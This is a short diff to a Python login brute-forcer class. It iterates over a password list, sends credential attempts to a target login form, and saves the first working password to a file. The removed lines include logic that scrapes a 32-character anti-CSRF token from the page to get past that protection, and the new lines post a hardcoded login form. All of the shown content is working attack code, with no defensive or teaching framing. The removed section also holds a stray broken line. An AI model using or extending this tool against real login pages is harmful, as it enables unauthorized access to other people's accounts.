@@ -134,22 +134,8 @@ class Thuan_01():
             # temp_file = self.create_temporary_copy(compress_file, passwords_list[1])
             for word in passwords_list:
                 password = word.strip('\r').strip('\n')
-                data0 = data.replace("^USER^", username)
-                data00 = data0.replace("PASS^", password)
-                # data1 = link + data00
-                cookie1 = json.loads(cookie)
-                # data1 = {"chkSubmit": "ok", "txtLoginId": username, "txtPassword": password, "txtSel": 1}
-                r
-                if len(token) > 1:
-                    rq = requests.get(data00, cookies=cookie1)
-                    content = rq.text
-                    tk = content.find(token)
-                    tk_value = "&" + token + "=" + content[(tk + len(token) + 9):(tk + len(token) + 9 + 32)] + "#"
-                    data11 = link.replace("#", tk_value)
-                    # value='32-chars'
-                    r = requests.get(data11, cookies=cookie1)
-                else:
-                    r = requests.get(data00, cookies=cookie1)
+                data1 = {"chkSubmit": "ok", "txtLoginId": username, "txtPassword": password, "txtSel": 1}
+                r = requests.post(link, data=data1)
                 stop = self.stop.get()
                 self.stop.put(stop)
                 if stop is False:  # if find password dont doing more is false
@@ -167,7 +153,7 @@ class Thuan_01():
                         # correctpwd = True
                         # print(f"Correct password {passwd}!\n")
                         with open("correct_pass.txt", "w") as f:
-                            f.write(password)
+                        	f.write(password)
                         break
 
                 else:
